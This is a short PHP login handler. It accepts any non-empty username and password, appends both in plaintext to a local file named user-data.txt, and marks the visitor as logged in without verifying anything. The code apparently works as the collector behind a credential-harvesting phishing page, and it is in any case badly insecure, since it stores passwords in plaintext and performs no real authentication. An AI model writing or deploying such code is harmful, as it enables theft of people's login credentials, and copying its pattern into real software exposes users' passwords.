<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';
    
    if (!empty($username) && !empty($password)) {
        $data = "Username: $username, Password: $password\n";
        file_put_contents('user-data.txt', $data, FILE_APPEND);
        
        $_SESSION['loggedin'] = true;
        $_SESSION['username'] = $username;
        
        header("Location: index.php");
        exit;
    } else {
        header("Location: login.html?error=emptyfields");
        exit;
    }
} else {
    header("Location: login.html");
    exit;
}
?>
